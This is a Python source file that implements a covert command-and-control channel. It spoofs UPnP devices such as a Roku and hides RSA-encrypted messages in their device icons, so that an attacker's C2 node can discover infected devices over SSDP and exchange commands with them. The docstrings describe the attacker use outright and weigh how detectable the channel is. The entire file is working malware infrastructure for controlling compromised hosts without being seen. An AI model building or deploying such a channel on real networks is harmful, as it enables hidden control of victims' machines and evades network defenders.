"""A covert channel implementation which embeds data into UPNP device icons
"""
import logging
import os
import queue
import sys
import threading
import time
import typing

import requests
import xmltodict

import secret_pixel
import ssdp
import upnp
import utils

log = logging.getLogger(__name__)


SEARCH_FREQUENCY = 5


class UPNPAgent:
    """A C2 for cloning UPNP devices and embedding payloads in UPNP icons
    """
    def __init__(
        self,
        preferred_devices=None,
        is_c2=False, passthrough=True,
        search_frequency=30
    ) -> None:
        """A client/server class for a UPNP based covert channel.
        
        This class provides a covert channel by embedding encrypted covert data
        into icons for UPNP devices. it supports a client/server model where an
        instance can be marked as the C2 server that an attacker can queue
        messages to other infected devices and issue commands to. Devices will
        utilize SSDP calls to discover and communicate bi-directionally.

        Parameters
        ----------
        is_c2 : bool, optional
            Flag to note that this is a C2 for the other devices, by default False
        passthrough: bool, default True
            If set to True, no cached responses are used and all requests are
            forwarded to the cloned device. This reduces risk of DoS of cloned
            device but potentially increases detectability.
        """
        preferred_devices = (
            [upnp.UPNPDevice] if preferred_devices is None else preferred_devices
        )
        self.private_key = utils.generate_rsa()
        self.public_key = self.private_key.public_key()
        self.target_device = None
        self.message_queue = queue.Queue()
        self.oversized_queue = queue.Queue()
        self.host_ip = utils.get_host_ip_address()
        self.agents = {}
        self.agent_messages = {}
        try:
            for upnp_device in preferred_devices:
                device = upnp_device(
                    passthrough=passthrough,
                    public_key=self.public_key,
                    message_queue=self.message_queue,
                    oversized_queue=self.oversized_queue
                )
                if device.target_root_device:
                    self.target_device = device
                    break
        except Exception as e:  # pylint: disable=W0612,W0718
            logging.error(
                "Could not find %s device on network.",
                self.target_device, exc_info=sys.exc_info
            )
            os._exit(1)
        threading.Thread(target=self._start_agent_search).start()
        threading.Thread(target=self._test_messages).start()

    def queue_message(self, target_ip, message):
        public_key = self.agents.get(target_ip)
        if public_key:
            message_mapping = self.agent_messages.get(target_ip,{})
            message_index = len(message_mapping)
            message_bytes = (
                int.to_bytes(
                    message_index, 4, byteorder=utils.GLOBAL_BYTE_ORDER) +
                message
            )
            message_mapping[message_index] = {
                'message': message_bytes,
            }
            self.message_queue.put(
                (target_ip, public_key, message_bytes)
            )
            self.agent_messages[target_ip] = message_mapping

    def _test_messages(self):
        hello = 0
        while True:
            for agent_ip in self.agents:
                if self.message_queue.empty():
                    self.queue_message(agent_ip, f"hello-{hello}".encode('utf8'))
                    print(f"Sending hello to {agent_ip}.")
                    hello += 1
            time.sleep(1)

    def process_message(self, agent_ip: str, message: bytes):
        message_index = int.from_bytes(message[:4], byteorder=utils.GLOBAL_BYTE_ORDER)
        message_content = message[4:]
        if agent_ip in self.agents:
            print(f"MESSAGE {agent_ip}: {message_content}")
            open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip}:{message_index} -> {message_content}\n")
        else:
            # Assume it's a public key
            try:
                public_key = utils.public_key_from_n(message)
                self.agents[agent_ip] = public_key
                self.queue_message(agent_ip, b'hello')
                log.info("Got new public key from {ip}.")
            except Exception: # pylint: disable=0718
                pass

    def _start_agent_search(self):
        while True:
            devices = ssdp.discover_ssdp_devices(
                ssdp_filter=self.target_device.ssdp_filter
            )
            for ip, services in devices.items():
                for st, service in services.items():
                    if ip == self.host_ip:
                        continue
                    try:
                        location = service.get('location')
                        ip, port = utils.extract_ip_port(location)
                        if location:
                            response = requests.get(location, timeout=10)
                            response.raise_for_status()
                            xml_dict = xmltodict.parse(response.text)
                            icons = xml_dict.get(
                                'root', {}
                            ).get(
                                'device', {}
                            ).get(
                                'iconList', {}
                            ).get(
                                'icon', []
                            )
                            # Correct if xmltodict returns a single icon and a list
                            icons = icons if isinstance(icons, typing.List) else [icons]
                            icon_paths = [icon['url'] for icon in icons if 'url' in icon]
                            for icon_path in icon_paths:
                                try:
                                    icon_full_path = f"http://{ip}:{port}/{icon_path}"
                                    icon_response = requests.get(
                                        icon_full_path, timeout=10)
                                    icon_response.raise_for_status()
                                    content = icon_response.content
                                    try:
                                        # See if it's a new agent
                                        n_bytes = secret_pixel.extract_bytes(content)
                                        if len(n_bytes) == utils.RSA_BIT_STRENGTH // 8:
                                            public_key = utils.public_key_from_n(n_bytes)
                                            self.agents[ip] = public_key
                                            log.info("Found agent at %s.", ip)                           
                                    except Exception as e:
                                        log.error("Error %s reading message from %s", e, ip)
                                    if ip in self.agents:
                                        try:
                                            message = secret_pixel.extract_bytes(content, self.private_key)
                                            self.process_message(ip, message)
                                        except Exception as e:
                                            log.error("Error %s reading message from  agent %s", e, ip)
                                except requests.HTTPError as e:
                                    log.info("Failed to get %s, skipping: %s", icon_full_path, e)
                                except Exception as e: # pylint: disable=W0718
                                    log.info("No message found in %s, skipping: %s", icon_full_path, e)
                    except requests.HTTPError:
                        pass
            time.sleep(SEARCH_FREQUENCY)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    spoofed_device = UPNPAgent(preferred_devices = [upnp.RokuDevice])
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        os._exit(0)
